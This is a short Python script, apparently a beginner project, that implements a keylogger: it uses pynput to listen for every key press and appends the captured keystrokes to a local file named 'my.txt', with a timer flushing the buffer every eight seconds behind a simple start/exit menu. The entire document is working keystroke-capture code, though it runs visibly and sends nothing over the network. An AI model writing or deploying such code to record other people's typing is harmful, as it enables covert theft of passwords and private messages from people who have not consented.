
import pynput.keyboard
import threading
import sys 
words = ""
print("Welcome to Key logger Programm \n")
print("Enter 1 - To start the program.")
print("Enter 2- To exit.")

# Function to print every key after a time interval
def keylogger():
        print("Running......")
        def delay():
            global words
            ls=open("my.txt","a")
            ls.write(words)
            words = " - "
            ls.close()
            x = threading.Timer(8,delay)
            x.start()
# Function for keys entered
        def logger(key):
            global words
            with open("my.txt","a") as ls:
        
                try:
                    words = words + str(key.char)
                    ls.write(str(key))
            
                except AttributeError:
                    if key == key.space:
                        words = words +" "
                    elif key == key.enter:
                        words = words +""
                    elif key == key.backspace:
                        words = words +""
                    elif key ==key.delete:
                        words = words +""
                    else:
                        words = words +" " +str(key) + ""
        keystrokes = pynput.keyboard.Listener(on_press=logger)
        with keystrokes :
            delay()
            keystrokes.join()

n = int(input("Enter Your choice - "))
if n==1:
    keylogger()
else:
    sys.exit("Have a Good Day")
